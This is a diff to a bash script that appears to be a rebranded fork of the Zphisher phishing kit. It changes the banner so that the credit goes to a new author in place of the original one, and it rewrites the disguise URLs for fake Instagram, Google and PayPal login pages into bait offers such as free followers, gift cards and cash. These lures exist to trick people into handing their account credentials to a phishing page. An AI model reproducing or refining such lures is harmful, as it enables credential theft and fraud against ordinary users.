@@ -203,17 +203,17 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		
+${ORANGE}██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗
+${ORANGE}██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝
+${ORANGE}██████╔╝███████║██║╚█████╗░███████║█████╗░░
+${ORANGE}██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░
+${ORANGE}██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗
+${ORANGE}╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+    ${RED}Version : ${__version__}
+
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by OneBlogs (Anonymous.Guy)${WHITE}
 	EOF
 }
 
@@ -660,7 +660,7 @@ site_instagram() {
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='https://get-unlimited-followers-for-instagram'
+			mask='https://get-5000-organic-followers-on-your-instagram'
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
@@ -691,11 +691,11 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='https://get-unlimited-google-drive-free'
+			mask='https://get-2000USD-for-free-to-run-google-ads'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='https://get-unlimited-google-drive-free'
+			mask='https://get-our-free-5000USD-google-play-gift-card'
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
@@ -775,7 +775,7 @@ main_menu() {
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='https://grab-this-free-5000-usd-free-plus-100USD-for-completing-survey-on-prize-rebel-to-your-paypal-acount'
 			tunnel_menu;;
 		7 | 07)
 			website="steam"
